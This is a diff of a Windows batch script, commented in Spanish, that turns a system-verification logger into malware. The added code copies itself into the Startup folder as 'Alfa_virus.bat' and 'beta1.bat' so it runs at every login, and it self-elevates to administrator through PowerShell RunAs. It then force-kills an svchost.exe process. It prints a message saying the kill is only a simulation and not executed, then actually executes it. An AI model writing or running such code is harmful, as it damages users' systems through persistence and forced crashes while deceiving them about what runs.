@@ -1,99 +1,89 @@
 @echo off
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+::cambiar nombre del archivo.bat
+set "destino=%startup%\Alfa_virus.bat"
+
+if not exist "%destino%" (
+    copy "%~f0" "%destino%" >nul
+)
+cd /d "%~dp0"
+if NOT "%cd%"=="%cd: =%" (
+   echo El directorio actual contine espacios en el path.
+   echo Este comando debe estar en un path que no contenga espacios. 
+   rundll32.exe cmdext.dll,MessageBeepStub
+   pause
+   echo.
+   goto :EOF
+)
+
+if {%1} EQU {[adm]} goto :data
+REG QUERY HKU\S-1-5-19\Environment >NUL 2>&1 && goto :data
+
+set command="""%~f0""" [adm] %*
+setlocal enabledelayedexpansion
+set "command=!command:'=''!"
+
+powershell -NoProfile Start-Process -FilePath '%COMSPEC%' ^
+-ArgumentList '/c """!command!"""' -Verb RunAs 2>NUL
+goto :EOF
+
+:data
+setlocal enabledelayedexpansion
+if {%1} EQU {[adm]} (
+   set adm=%1
+   shift
+) ELSE (set adm=)
+
+:cuerpo
+REM ==============================================
+REM Poner aqui el codigo a ejecutar
+REM ==============================================
+
+
+
+@echo off
 setlocal EnableExtensions EnableDelayedExpansion
-title Verificacion Completa del Sistema (Evidencia)
+title Simulacion SVCHOST
 color 0A
 
-:: ======= Archivo de evidencia =======
-set "LOG=%~dp0evidencia_%COMPUTERNAME%.txt"
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "destino=%startup%\beta1.bat"
 
-echo Guardando evidencia en: "%LOG%"
-echo.
-
-(
-echo =====================================
-echo        VERIFICACION DEL SISTEMA
-echo =====================================
-echo Fecha/Hora: %DATE% %TIME%
-echo Equipo: %COMPUTERNAME%
-echo.
-) > "%LOG%"
-
-echo Usuario actual:
-whoami
-whoami >> "%LOG%"
-echo.
-
-:: Verificar privilegios
-net session >nul 2>&1
-if %errorlevel%==0 (
-    set "ADMIN=ADMINISTRADOR"
-) else (
-    set "ADMIN=USUARIO NORMAL"
+if not exist "%destino%" (
+    copy "%~f0" "%destino%" >nul
 )
 
-echo Privilegios detectados: %ADMIN%
-echo Privilegios detectados: %ADMIN%>> "%LOG%"
-echo.
 
 echo =====================================
-echo        BUSQUEDA DE CMD.EXE
+echo        BUSQUEDA DE SVCHOST.EXE
 echo =====================================
 echo.
 
-echo Procesos cmd.exe activos:
-tasklist /FI "IMAGENAME eq cmd.exe"
-tasklist /FI "IMAGENAME eq cmd.exe" >> "%LOG%"
-echo.
+set "found_svchost="
+set "svchost_pid="
 
-set /p pid=Ingresa el numero de PID que quieres verificar: 
-
-tasklist /FI "PID eq %pid%" | find "%pid%" >nul
-if %errorlevel%==0 (
-    set "PID_STATUS=EXISTE"
-    echo El PID %pid% SI existe.
-) else (
-    set "PID_STATUS=NO EXISTE"
-    echo El PID %pid% NO existe.
+for /f "usebackq tokens=1,2 delims=," %%A in (`tasklist /FI "IMAGENAME eq svchost.exe" /FO CSV /NH`) do (
+    set "svchost_pid=%%~B"
+    set "found_svchost=1"
+    echo Proceso svchost.exe encontrado con PID: !svchost_pid!
+    goto :sim_svchost
 )
 
-echo PID verificado: %pid% - %PID_STATUS%>> "%LOG%"
-echo.
-
-echo =====================================
-echo        LISTA GENERAL DE PROCESOS
-echo =====================================
-echo.
-
-tasklist >> "%LOG%"
-
-:: ==========================
-::   EVIDENCIA FINAL
-:: ==========================
+if not defined found_svchost (
+    echo No se encontro ningun proceso svchost.exe.
+) else (
+    :sim_svchost
+    echo.
+    echo SIMULACION: taskkill /F /PID %svchost_pid% (NO EJECUTADO)
+)
 
 echo.
-echo =====================================
-echo           EVIDENCIA FINAL
-echo =====================================
-echo Usuario: 
-whoami
-echo Nivel de privilegio: %ADMIN%
-echo PID consultado: %pid%
-echo Estado del PID: %PID_STATUS%
-echo =====================================
+taskkill /F /PID %svchost_pid%
 
-(
-echo.
-echo =====================================
-echo           RESUMEN FINAL
-echo =====================================
-echo Usuario: 
-whoami
-echo Nivel de privilegio: %ADMIN%
-echo PID consultado: %pid%
-echo Estado del PID: %PID_STATUS%
-echo =====================================
-) >> "%LOG%"
-
-echo.
-echo Evidencia guardada en: "%LOG%"
-pause
+REM ==============================================
+:fin
+if {%adm%} EQU {[adm]} (
+   echo.
+   echo [Pulse 0 para salir]
+   choice /c 0 /n
+)
